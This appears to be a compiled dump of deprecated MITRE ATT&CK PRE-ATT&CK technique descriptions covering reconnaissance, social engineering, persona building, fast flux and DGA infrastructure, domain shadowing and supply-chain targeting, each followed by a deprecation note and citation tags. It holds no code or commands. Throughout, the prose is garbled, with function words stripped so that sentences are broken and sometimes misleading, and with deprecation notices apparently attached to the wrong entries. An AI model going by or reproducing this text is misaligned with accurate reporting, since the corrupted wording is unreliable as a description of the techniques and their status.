object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1277).

Data sets Security Exchange Commission (SEC) filings public phone numbers. datasets publicly purchased variety data vendors.  source intelligence (OSINT) intelligence gathered publicly sources. include gathered on-line physical world. (Citation: SANSThreatProfile) (Citation: Infosec-osint) (Citation: isight-osint) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1237).

Once created, intelligence requirements, Key Intelligence Topics (KITs), Key Intelligence Questions (KIQs) submitted central management system. (Citation: ICD204) (Citation: KIT-Herring) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1332).

Code signing process digitally signing executables scripts confirm software author guarantee code altered corrupted. Users trust signed piece code unsigned piece code issued certificate author is. (Citation: DiginotarCompromise) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Clicking links email, attachments, visiting websites result drive downloads result compromise users performing actions cyber nature. (Citation: AnonHBGary) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1263).

Security defensive capabilities designed limit unauthorized network traffic types accesses. (Citation: OSFingerprinting2014) (Citation: NMAP WAF NSE) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1356).

Callbacks malware communications seeking instructions. adversary malware ensure instructions conveyed callback software reached. (Citation: LeeBeaconing) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1267).

Job postings, company sites, forums, provide organizational structure provide contact organization. adversary  people organization valuable social engineering attempts. (Citation: JobPostingThreat) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1289).

Analyze strengths weaknesses target potential focus compromise efforts. (Citation: FakeLinkedIn) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1269).

The attempt identify people inherent weakness direct indirect targeting determine approach compromise person organization.  targets include individuals poor OPSEC practices trusted relationship intended target. (Citation: RSA-APTRecon) (Citation: Scasny2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1321).

Certain types traffic Twitter14, HTTP) commonly others. Utilizing common protocols software adversary's traffic difficult distinguish legitimate traffic. (Citation: symantecNITRO) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Replacing legitimate binary malware accomplished replacing binary legitimate download standing fake alternative malicious binary. intent user download malicious binary executing malware. (Citation: FSecureICS) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Users performing legitimate activity media compromised USB drive malware installed manufacture supply). insertion media auto-runs malware executes action user. (Citation: WSUSpect2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1233).

Analysts identify gap generate compelling generate Key Intelligence Topic (KIT) Key Intelligence Question (KIQ). (Citation: BrighthubGapAnalysis) (Citation: ICD115) (Citation: JP2-01) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1344).

Once persona developed adversary create connections targets interest. connections direct include connect others. (Citation: NEWSCASTER2014) (Citation: BlackHatRobinSage) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1363).

Redirecting communication request address port combination another. set obfuscate final location communications occur stages attack. (Citation: SecureWorks HTRAN Analysis) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1230).

Leadership key decision makers derive specific intelligence requirements Key Intelligence Topics (KITs) Key Intelligence Questions (KIQs).  Specific intelligence requirements assist analysts gathering establish baseline topic question collection managers clarify types collected satisfy requirement. (Citation: LowenthalCh4) (Citation: Heffter) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1347).

Delivery systems infrastructure adversary host malware tools exploitation. Building configuring delivery systems include multiple activities registering domain names, renting hosting space, configuring exploited environments. (Citation: APT1) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1360).

An  adversary physical access options preparation actual attack. range observing behaviors noting security precautions attempting access. (Citation: OCIAC Pre Incident Indicators) (Citation: NewsAgencySpy) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1264).

Technology usage patterns include identifying users offsite, connect remotely, restricted/secured access techniques. (Citation: SANSRemoteAccess) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1308).

A wide variety 3rd party software services  [Twitter](https://twitter.com), [Dropbox](https://www.dropbox.com), [GoogleDocs](https://www.google.com/docs/about)). solutions adversary stage, launch, execute attack infrastructure physically tie rapidly provisioned, modified, shut down. (Citation: LUCKYCAT2012) (Citation: Nemucod Facebook) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1298).

Once 3rd party vendor identified probed vulnerabilities main target be. (Citation: Zetter2015Threats) (Citation: WSJTargetBreach) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1280).

Understanding organizations business processes tempo adversary effectively craft social engineering attempts hide technical actions, generate network traffic. (Citation: Scasny2015) (Citation: Infosec-osint) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1320).

Certain types traffic DNS tunneling, header inject) user-defined fields. fields hide data. addition hiding data network protocols, steganography techniques hide data images file formats. Detection difficult signature known. (Citation: BotnetsDNSC2) (Citation: HAMMERTOSS2015) (Citation: DNS-Tunnel) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1282).

Physical locality adversary shape social engineering attempts (language, culture, events, weather, etc.) plan physical actions dumpster diving attempting access facility. (Citation: RSA-APTRecon) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1311).

Dynamic DNS method automatically updating DNS system. Providers offer rapid reconfiguration IPs hostnames service. (Citation: DellMirage2012) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1335).

An adversary require physical hardware software. lightweight set-up activities on-line infrastructure. Or, build extensive infrastructure test, communicate, control aspects activities systems. (Citation: NYTStuxnet) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1250).

Domain Names human readable names represent IP addresses. IP addresses unique identifier computing devices network. pieces valuable adversary understand structure network. (Citation: RSA-APTRecon) **This technique deprecated. [Fast Flux DNS](https://attack.mitre.org/techniques/T1568/001).**

A technique qualified domain multiple IP addresses assigned swapped extreme frequency, combination robin IP address short Time-To-Live (TTL) DNS resource record. (Citation: HoneynetFastFlux) (Citation: MisnomerFastFlux) (Citation: MehtaFastFluxPt1) (Citation: MehtaFastFluxPt2) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1342).

Both newly built personas pre-compromised personas require development additional documentation real. include filling profile information, developing social networks, incorporating photos. (Citation: NEWSCASTER2014) (Citation: BlackHatRobinSage) (Citation: RobinSageInterview) **This technique deprecated. [Domain Generation Algorithms](https://attack.mitre.org/techniques/T1568/002).**

The algorithms malware periodically generate domain names function rendezvous malware command control servers. (Citation: DamballaDGA) (Citation: DambballaDGACyberCriminals) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1346).

A payload malware performs malicious action. adversary re-use payloads capability available. (Citation: SonyDestover) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1307).

A wide variety cloud, virtual private services, hosting, compute, storage solutions available. Additionally botnets rent purchase. solutions adversary stage, launch, execute attack infrastructure physically tie rapidly provisioned, modified, shut down. (Citation: LUCKYCAT2012) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1256).

An adversary attempt identify defensive services [CloudFlare](https://www.cloudflare.com), [IPBan](https://github.com/jjxtra/Windows-IP-Ban-Service), [Snort](https://www.snort.org). passively detecting services, [CloudFlare](https://www.cloudflare.com) routing, actively, purposefully tripping security defenses. (Citation: NMAP WAF NSE) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1266).

Open source intelligence (OSINT) free, target providing target indication interest.  assist adversary crafting successful approach compromise. (Citation: RSA-APTRecon) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

The utilization resources owned adversary launch exploits operations. includes utilizing equipment compromised leveraging access  gained methods (such compromising employee business partner location). (Citation: CitizenLabGreatCannon) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

A technique takes advantage flaws client-side applications targeting specific users. example, exploit public intended drive-by delivery visits site. (Citation: CitizenLabGreatCannon) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1379).

Removable media malware injected supply chain scale. physically targeted manner. intent user utilize removable media adversary gain access. (Citation: USBMalwareAttacks) (Citation: FPDefendNewDomain) (Citation: ParkingLotUSB) **This technique deprecated. [Phishing](https://attack.mitre.org/techniques/T1566) appropriate.**

Emails phishing messages attachments links websites. designed user follow action calling phone wiring money. elicit email response confirm existence account user. (Citation: Paypal Phone Scam) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1305).

Every domain registrar maintains publicly viewable database displays contact registered domain. Private 'whois' services display alternative information, company data, owner domain. (Citation: APT1) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1302).

Physical access required types adversarial actions. (Citation: CyberPhysicalAssessment) (Citation: CriticalInfrastructureAssessment) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1322).

The credentials adversary intent hide true identity portray person entity.  adversary misattributable credentials attack convince victim credentials legitimate trustworthy case. (Citation: FakeSSLCerts) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1303).

Outsourcing, arrangement company providing services company in-house, avenue adversary target. Businesses networks, portals, technical connections outsourced/partner organizations exploited. Additionally, outsourced/partner organization provide opportunities phishing. (Citation: Scasny2015) (Citation: OPM Breach) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1319).

Obfuscation creating code difficult understand. Encoding transforms code publicly format. Encryption transforms code requires key reverse encryption. (Citation: CylanceOpCleaver) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1365).

During production distribution, placement software, firmware, CPU chip computer, handheld, electronic device enables adversary gain illegal entrance. (Citation: McDRecall) (Citation: SeagateMaxtor) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Credential pharming  form attack designed steal users' credential redirecting users fraudulent websites. Pharming conducted changing hosts file victim's exploitation vulnerability DNS server software. (Citation: DriveByPharming) (Citation: GoogleDrive Phishing) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1396).

Configure setup booter/stressor services, intended server stress testing, enable denial service attacks. (Citation: Krebs-Anna) (Citation: Krebs-Booter) (Citation: Krebs-Bazaar) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1340).

The process gathering domain account credentials silently create subdomains malicious servers tipping actual owner. (Citation: CiscoAngler) (Citation: ProofpointDomainShadowing) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Many mobile devices configured applications installed mainstream vendor app stores Apple App Store Google Play Store).  app stores scan submitted applications malicious behavior.  However, applications evade scans downloading executing code runtime included original application package. (Citation: Fruit Zombies) (Citation: Android Hax) (Citation: Execute This!) (Citation: Fake News App) (Citation: Computing kill 2FA) (Citation: Android Security Review 2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1328).

Domain Names human readable names represent IP addresses. purchased or, cases, acquired free. (Citation: PWCSofacy2014) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1251).

For computing resource accessible public, domain names IP addresses registered authorized organization. (Citation: Google Domains WHOIS) (Citation: FunAndSun2012) (Citation: Scasny2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1349).

An exploit takes advantage bug vulnerability unintended unanticipated behavior occur hardware software. adversary modify existing exploits exploits relevant environment compromise. (Citation: NYTStuxnet) (Citation: NationsBuying) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1330).

A wide variety 3rd party software services  [Twitter](https://twitter.com), [Dropbox](https://www.dropbox.com), [GoogleDocs](https://www.google.com/docs/about)). solutions adversary stage, launch, execute attack infrastructure physically tie rapidly provisioned, modified, shut down. (Citation: LOWBALL2015) **This technique deprecated. [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002).**

Emails malicious links designed user link deliver malware payloads. (Citation: GoogleDrive Phishing) (Citation: RSASEThreat) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1312).

Instead buying, leasing, renting infrastructure adversary compromise infrastructure attack cycle. (Citation: WateringHole2014) (Citation: FireEye Operation SnowMan) **This technique deprecated. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) [External Remote Services](https://attack.mitre.org/techniques/T1133) appropriate.**

Externally facing systems connections network normal operations.  Externally facing systems include, limited to, websites, portals, email, DNS, FTP, VPN concentrators, boarder routers firewalls. systems demilitarized zone (DMZ) internal environment. (Citation: CylanceOpCleaver) (Citation: DailyTechAntiSec) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Attempt default vendor credentials, brute force credentials, legitimate credentials authenticate remotely. access portal, VPN, phone app. (Citation: Remote Access Healthcare) (Citation: RDP Sale) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1238).

Once generated, Key Intelligence Topics (KITs), Key Intelligence Questions (KIQs), intelligence requirements assigned applicable agencies personnel. example, adversary decide nuclear energy requirements assigned specific organization based mission. (Citation: AnalystsAndPolicymaking) (Citation: JP2-01) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1226).

Leadership conducts cost/benefit analysis generates compelling gathering triggers Key Intelligence Toptic (KIT) Key Intelligence Question (KIQ). example, adversary compares cost cyber intrusions expected benefits increased intelligence collection cyber adversaries. (Citation: LowenthalCh4) (Citation: KIT-Herring) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1390).

Google Apple provide Google Cloud Messaging Apple Push Notification Service, respectively, services designed enable efficient communication third-party mobile app backend servers mobile apps running individual devices. services maintain encrypted connection mobile device Google Apple easily inspected allowed traverse networks normal device operation. services adversaries communication compromised mobile devices. (Citation: Securelist Mobile Malware 2013) (Citation: DroydSeuss) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1338).

Fake certificates acquired legal process coercion. Or, adversary trick Certificate Authority issuing certificate. fake certificates Man-in-the-Middle attacks. (Citation: SubvertSSL) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1333).

Dynamic DNS automated method rapidly update domain mapping hostnames IPs. (Citation: FireEyeSupplyChain) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1292).

An adversary detections malicious emails files  publicly services, virus total, files emails alert. services openly publicly publish internal infrastructure. (Citation: WiredVirusTotal) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1301).

Business processes, typically communicates who, supply chain part, provide opportunities social engineering  (Citation: Warwick2015) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

A technique compromise victims victims visit compromised redirects browser malicious site, exploit kit's landing page.  exploit kit landing probe victim's operating system, browser, software exploitable vulnerability infect victim. (Citation: GeorgeDriveBy) (Citation: BellDriveBy) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1265).

Supply chains include people, processes, technologies product service supplier consumer. Understanding supply chains provide adversary opportunities exploit people, positions, relationships, supply chain. (Citation: SmithSupplyChain) (Citation: CERT-UKSupplyChain) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1354).

There delay vulnerability exploit discovered public. adversary target systems vulnerabilities gain knowledge attack. (Citation: TempertonDarkHotel) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1272).

Business relationship includes associates target discovered social media sites [LinkedIn](https://www.linkedin.com) public press releases announcing partnerships organizations people (such key hire announcements industry articles).  adversary shape social engineering attempts (exploiting target expects hear from) plan technical actions exploiting network trust relationship. (Citation: RSA-APTRecon) (Citation: Scasny2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1227).

Leadership derives Key Intelligence Topics (KITs) Key Intelligence Questions (KIQs) them.  KITs expression management's intelligence respect warning, strategic operational decisions, knowing competition, understanding competitive situation. KIQs critical questions aligned KIT provide basis collection plans, create context analytic work, identify external operations. (Citation: Herring1999) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1327).

A technique adversary Dynamic DNS exception multiple DNS infrastructures whois records. (Citation: KrebsStLouisFed) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1281).

Templates branding materials adversary add authenticity social engineering message. (Citation: Scasny2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1273).

An adversary source target commonly social media sites [Facebook](https://www.facebook.com), [Instagram](https://www.instagram.com), [Pinterest](https://www.pinterest.com).  Social media public design insight inherent weaknesses target exploitation adversary. (Citation: RSA-APTRecon) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1258).

Firmware permanent software programmed read-only memory device. types software, firmware updated time multiple versions. (Citation: Abdelnur Advanced Fingerprinting) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1286).

Dumpster diving waste technology, people, organizational items interest. (Citation: FriedDumpsters) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1314).

Host based hiding techniques designed adversary remain undetected machine action.  static linking binaries, polymorphic code, exploiting weakness file formats, parsers, self-deleting code. (Citation: VirutAP) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

A technique push [iOS](https://www.apple.com/ios) [Android](https://www.android.com) MMS-type message target require interaction target successful. (Citation: BlackHat Stagefright) (Citation: WikiStagefright) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

A technique compromise specific users advantage flaws client-side applications. example, infecting websites targeted visit goal infect targeted user's computer. (Citation: RSASEThreat) (Citation: WikiStagefright) (Citation: ForbesSecurityWeek) (Citation: StrongPity-waterhole) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1331).

Obfuscation hiding day-to-day building testing tools, chat servers, etc. (Citation: FireEyeAPT17) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1336).

An adversary skills set procured equipment software create desired infrastructure. (Citation: KasperskyRedOctober) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1283).

Business relationship adversary shape social engineering attempts (exploiting target expects hear from) plan technical actions exploiting network trust relationship. (Citation: 11StepsAttackers) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1249).

Social Engineering practice manipulating people divulge action. (Citation: SEAttackVectors) (Citation: BeachSE2003) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1271).

Personnel internally company non-electronic specialized access, authorities, privilege attractive target adversary.  individual financial authority authorize transactions.  adversary compromises individual subvert dollar transfers. (Citation: RSA-APTRecon) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

DNS (cache) poisoning corruption Internet server's domain table replacing Internet address another, rogue address. user seeks address, request redirected rogue entry table address. (Citation: Google DNS Poisoning) (Citation: DNS Poisoning China) (Citation: Mexico Modem DNS Poison) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1278).

Job postings, company sites, forums, provide organizational structure, needs, gaps organization. adversary indication weakness organization (such under-resourced shop). Job postings provide organizations structure valuable social engineering attempts. (Citation: JobPostingThreat) (Citation: RSA-APTRecon) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1287).

An adversary assess collected software/hardware versions, vulnerabilities, patch level, etc.  analyze technical scanning identify weaknesses confirmation architecture. (Citation: SurveyDetectionStrategies) (Citation: CyberReconPaper) (Citation: RSA-APTRecon) (Citation: FireEyeAPT28) **This technique deprecated. [DNS Calculation](https://attack.mitre.org/techniques/T1568/003).**

DNS Calc technique octets IP address calculate port  command control servers initial DNS request. (Citation: CrowdstrikeNumberedPanda) (Citation: FireEyeDarwinsAPTGroup) (Citation: Rapid7G20Espionage) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1247).

Open source intelligence (OSINT) intelligence gathered publicly sources. include gathered on-line, search engines, physical world. (Citation: RSA-APTRecon) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1276).

Supply chains include people, processes, technologies product service supplier consumer. Understanding supply chains provide adversary opportunities exploit organizational relationships. (Citation: SmithSupplyChain) (Citation: CERT-UKSupplyChain) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1235).

Analysts receive intelligence requirements leadership process satisfy requirement.  process include delineating thinking aspects associating satisfying requirement. (Citation: FBIIntelligencePrimer) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1262).

Client configurations operating browser, additional version language, transmitted browsing communications.  accomplished including compromised collect details visiting computers. (Citation: UnseenWorldOfCookies) (Citation: Panopticlick) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1246).

Supply chains include people, processes, technologies product service supplier consumer. Understanding supply chains provide adversary opportunities exploit technology interconnections supply chain. (Citation: SmithSupplyChain) (Citation: CERT-UKSupplyChain) (Citation: RSA-supply-chain) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1329).

A wide variety cloud, virtual private services, hosting, compute, storage solutions available. Additionally botnets rent purchase. solutions adversary stage, launch, execute attack infrastructure physically tie rapidly provisioned, modified, shut down. (Citation: TrendmicroHideoutsLease) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1391).

The adversary account credentials signing existing mobile app developer publish malicious updates existing mobile apps application store, abuse developer's identity reputation publish malicious apps.  mobile devices configured automatically install versions already-installed apps. (Citation: Fraudenlent Apps Stolen Dev Credentials) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1300).

Analyze strengths weaknesses target potential focus compromise efforts. (Citation: FakeLinkedIn) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1274).

An adversary identify sensitive personnel typically posted social media site, address, marital status, financial history, law enforcement infractions. conducted searching public records frequently cost online. (Citation: RSA-APTRecon) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1254).

Active scanning sending transmissions nodes, analyzing responses, identify communications system. (Citation: RSA-APTRecon) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1350).

An exploit takes advantage bug vulnerability unintended unanticipated behavior occur hardware software. adversary discover exploits existing exploits relevant environment compromise. adversary monitor exploit provider forums understand existing, newly discovered, exploits. (Citation: EquationQA) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1260).

